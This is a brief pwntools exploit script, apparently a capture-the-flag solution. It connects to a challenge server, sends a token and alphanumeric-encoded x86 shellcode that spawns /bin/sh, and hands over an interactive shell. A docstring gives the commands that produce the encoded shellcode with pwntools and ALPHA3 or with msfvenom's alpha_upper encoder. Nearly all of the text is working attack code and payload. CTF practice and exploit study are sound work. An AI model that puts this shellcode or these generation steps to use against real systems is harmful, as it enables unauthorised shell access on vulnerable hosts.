'''
from pwn import *

with open('shellcode.bin', 'w') as f:
  f.write(asm(shellcraft.sh()))

THEN
$ py -2 ALPHA3.py x86 ascii uppercase eax --input="shellcode.bin"

OR JUST
$ msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/sh" -e x86/alpha_upper BufferRegister=eax
'''
from pwn import *

context.log_level = 'DEBUG'

#p=process('./chall2')
p = remote('202.38.93.241', 10002)

p.recvuntil(':')
p.sendline('token') # token

p.send('PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06')

p.interactive()